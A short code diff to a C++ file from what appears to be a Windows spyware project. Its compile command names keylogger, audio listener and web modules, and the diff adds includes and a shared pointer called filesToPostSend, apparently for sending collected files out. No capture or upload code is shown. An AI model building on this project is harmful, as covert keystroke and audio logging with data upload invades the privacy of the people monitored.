@@ -4,6 +4,8 @@
 // Command to compile : g++ *.cpp listener/*.cpp keylogger/*.cpp threads/*.cpp web/*.cpp -lwinmm -lws2_32
 
 #include <iostream>
+#include <fstream>
+#include <sstream>
 #include <windows.h>
 #include <WinSock2.h>
 #include <mmsystem.h>
@@ -13,6 +15,10 @@
 #include <cmath>
 #include <climits>
 #include <ctime>
+#include <atomic>
+
+extern std::atomic<std::string *>filesToPostSend;
+
 #include "audioListener.hpp"
 #include "bufferAnalysis.hpp"
 #include "threadForAudio.hpp"
